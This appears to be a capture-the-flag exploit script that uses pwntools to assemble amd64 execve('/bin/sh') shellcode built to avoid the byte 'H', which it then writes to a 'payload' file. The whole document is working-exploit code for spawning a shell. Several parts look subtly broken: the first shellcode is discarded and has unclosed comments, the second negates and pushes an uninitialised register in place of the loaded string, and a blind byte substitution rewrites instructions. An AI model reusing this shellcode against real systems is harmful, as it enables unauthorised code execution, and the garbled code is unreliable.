#!/usr/bin/env python

from pwn import *
context.arch = 'amd64'

shellcode = """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68

    /* has 'H' */
    movabs rax, 0x732f2f2f6e69622f
    push r8
    /* mov rax, 0x732f2f2f6e69622f */
    /* push rax */

    /* push 0x732f2f2f */
    /* push 0x6e69622f */

    /* has 'H' */
    /* mov rdi, rsp */
    push rsp
    pop rdi

    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    
    /* push 8 */
    /* pop rsi */

    /* has 'H' */
    /* rsi = 8 + rsp
    /* add rsi, rsp */
    push rsp
    pop rsi
    add esi, 8
    
    push rsi /* 'sh\x00'

    /* has 'H' */
    /* mov rsi, rsp */
    push rsp
    pop rdi

    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
"""

shellcode = """
    mov rbx, 0xFF978CD091969DD1
    neg r11
    push r11
    /* neg rbx */
    /* push rbx */
    xor eax, eax
    cdq
    xor esi, esi
    push rsp
    pop rdi
    mov al, 0x3b  /* sys_execve */
    syscall
"""

with open("payload", "wb") as out:
    payload = asm(shellcode, arch = 'amd64')
    payload = payload.replace('H', 'I')
    out.write(payload)
